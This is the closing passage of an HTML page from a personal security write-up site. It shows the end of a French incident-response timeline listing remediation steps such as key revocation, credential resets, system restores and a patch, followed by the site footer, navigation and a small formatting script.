id="LSbD">Mise √† jour d‚ÄôAcrobat Reader sur toutes les machines.</td></tr><tr id="1ea25200-7eb4-8026-b3c7-e1da5c66002a"><td class="" id="m@N\">22 avril 2019, 05:01:08</td><td class="" id="LSbD">R√©vocation des cl√©s API compromises.</td></tr><tr id="1ea25200-7eb4-8016-8e45-fa4c2a49e212"><td class="" id="m@N\">22 avril 2019, 05:05:08</td><td class="" id="LSbD">R√©initialisation des identifiants des utilisateurs affect√©s.</td></tr><tr id="1ea25200-7eb4-8020-abfb-c970f5ff5390"><td class="" id="m@N\">22 avril 2019, 05:21:20</td><td class="" id="LSbD">Restauration de <strong>WKST01</strong> depuis une sauvegarde v√©rifi√©e.</td></tr><tr id="1ea25200-7eb4-80aa-a648-eb6584433f2c"><td class="" id="m@N\">22 avril 2019, 05:58:50</td><td class="" id="LSbD">Restauration de <strong>HR01</strong> depuis une sauvegarde v√©rifi√©e.</td></tr><tr id="1ea25200-7eb4-8071-9c80-ebb83468c3a1"><td class="" id="m@N\">22 avril 2019, 06:33:44</td><td class="" id="LSbD">D√©ploiement du correctif pour la vuln√©rabilit√© buffer overflow de l‚Äôapplication RH.</td></tr></tbody></table></div></figure></div></details></div></details><p class="" id="1ea25200-7eb4-8015-a829-d5387cd2367b">
</p><p class="" id="1ea25200-7eb4-8098-860a-efaf9db03429">
</p><figure class="block-color-gray_background callout" id="1ea25200-7eb4-80f6-a09d-f7cff66ae799" style="white-space:pre-wrap;display:flex"><div style="font-size:1.5em"><span class="icon"></span></div><div style="width:100%"><p class="" id="1ea25200-7eb4-8041-8867-e625ef1e5c12"><strong>c4tz                                          6/05/25<br/><br/> </strong></p></div></figure><p class="" id="1ea25200-7eb4-80a9-9652-cbaee66c9d68">
</p><p class="" id="1ea25200-7eb4-80fd-8749-ce78b9800fc5">
</p><p class="" id="1ea25200-7eb4-8029-a5ea-efe69d875985">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></section>
</main>
<footer class="footer">¬© 2025 c4tz ‚Äî dark minimal</footer>
</div>
</div>
<nav aria-label="Navigation mobile" class="mobile-nav">
<a href="writeup.html"><span>WriteUp</span></a>
<a href="portfolio.html"><span>Portfolio</span></a>
<a href="skills.html"><span>Skills</span></a>
<a href="about.html"><span>About</span></a>
</nav>
<script>
(function(){
  // 2) rewrite image links to static/image/
  document.querySelectorAll('.prose img').forEach(function(img){
    var src = img.getAttribute('src')||'';
    if(/^image(%20|\s|%[\dA-Fa-f]{2}|)\d*\.png$/.test(src) || /^image\.png$/.test(src)){
      try{
        img.src = 'static/image/' + decodeURIComponent(src);
      }catch(e){
        img.src = 'static/image/' + src;
      }
    }
  });
  // convert <a href="image X.png"> wrappers too
  document.querySelectorAll('.prose a[href]').forEach(function(a){
    var href = a.getAttribute('href')||'';
    if(/^image(%20|\s|%[\dA-Fa-f]{2}|)\d*\.png$/.test(href) || /^image\.png$/.test(href)){
      try{
        a.setAttribute('href','static/image/' + decodeURIComponent(href));
      }catch(e){
        a.setAttribute('href','static/image/' + href);
      }
    }
  });

  // 1) convert pseudo-markdown inside <pre><code> when it's actually prose
  function looksLikeProse(text){
    var codeChars = /[{};<>\[\]\(\);=]/;
    var hasHeadings = /(^|\n)\s*#{2,4}\s+/m.test(text);
    var manyWords = (text.match(/\w+/g)||[]).length > 40;
    var fewCode = !codeChars.test(text);
    // markers 'spl', 'powershell' suggest real code; don't convert
    var isRealCode = /(powershell|spl|cmd\.exe|regex|C:\\|SELECT|curl|http:|https:)/i.test(text);
    return (hasHeadings || manyWords) && fewCode && !isRealCode;
  }

  document.querySelectorAll('.prose pre code').forEach(function(code){
    var text = code.textContent;
    if(looksLikeProse(text)){
      var parentPre = code.closest('pre');
      var container = document.createElement('div');
      container.className = 'converted-prose';
      // basic markdown to HTML
      text.split(/\n{2,}/).forEach(function(block){
        if(/^\s*####\s+/.test(block)){ var el=document.createElement('h4'); el.textContent=block.replace(/^\s*####\s+/, ''); container.appendChild(el); return;}
        if(/^\s*###\s+/.test(block)){ var el=document.createElement('h3'); el.textContent=block.replace(/^\s*###\s+/, ''); container.appendChild(el); return;}
        if(/^\s*##\s+/.test(block)){ var el=document.createElement('h2'); el.textContent=block.replace(/^\s*##\s+/, ''); container.appendChild(el); return;}
        if(/^\s*-\s+|\*\s+/.test(block)){ // list
          var ul=document.createElement('ul');
          block.split(/\n/).forEach(function(line){
            var m=line.match(/^\s*(?:-|\*)\s+(.*)$/); if(m){ var li=document.createElement('li'); li.textContent=m[1]; ul.appendChild(li); }
          });
          container.appendChild(ul); return;
        }
        if(/^\s*---\s*$/.test(block)){ container.appendChild(document.createElement('hr')); return; }
        // paragraph
        var p = document.createElement('p'); p.textContent = block.trim(); container.appendChild(p);
      });
      parentPre.replaceWith(container);
    }
  });
})();</script>
</html>
